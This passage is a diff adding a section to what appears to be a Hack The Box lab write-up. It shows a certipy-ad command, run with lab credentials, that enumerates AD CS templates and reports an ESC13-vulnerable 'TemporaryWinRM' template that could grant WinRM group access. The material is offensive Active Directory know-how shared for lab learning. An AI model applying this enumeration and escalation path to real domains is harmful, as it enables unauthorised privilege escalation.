@@ -230,5 +230,76 @@ And after ingesting this i see there is a trust between the two domains
 # ADCS (ESC13)
 
 ```python
+❯❯❯ faketime -f +8h certipy-ad find -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -enabled -stdout -vulnerable
 
+Certificate Authorities
+  0
+    CA Name                             : ping-DC1-CA
+    DNS Name                            : dc1.ping.htb
+    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
+    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
+    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
+    Certificate Validity End            : 2126-04-20 19:04:41+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Unknown
+    Request Disposition                 : Unknown
+    Enforce Encryption for Requests     : Unknown
+    Active Policy                       : Unknown
+    Disabled Extensions                 : Unknown
+Certificate Templates
+  0
+    Template Name                       : TemporaryWinRM
+    Display Name                        : Temporary WinRM
+    Certificate Authorities             : ping-DC1-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-12-23T17:19:28+00:00
+    Template Last Modified              : 2025-12-27T21:12:15+00:00
+    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
+    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : PING.HTB\Domain Admins
+                                          PING.HTB\Domain Users
+                                          PING.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : PING.HTB\Administrator
+        Full Control Principals         : PING.HTB\Domain Admins
+                                          PING.HTB\Enterprise Admins
+        Write Owner Principals          : PING.HTB\Domain Admins
+                                          PING.HTB\Enterprise Admins
+        Write Dacl Principals           : PING.HTB\Domain Admins
+                                          PING.HTB\Enterprise Admins
+        Write Property Enroll           : PING.HTB\Domain Admins
+                                          PING.HTB\Domain Users
+                                          PING.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : PING.HTB\Domain Users
+    [!] Vulnerabilities
+      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
 ```
+
+Looks like i can grant winrm access through ESC13
+
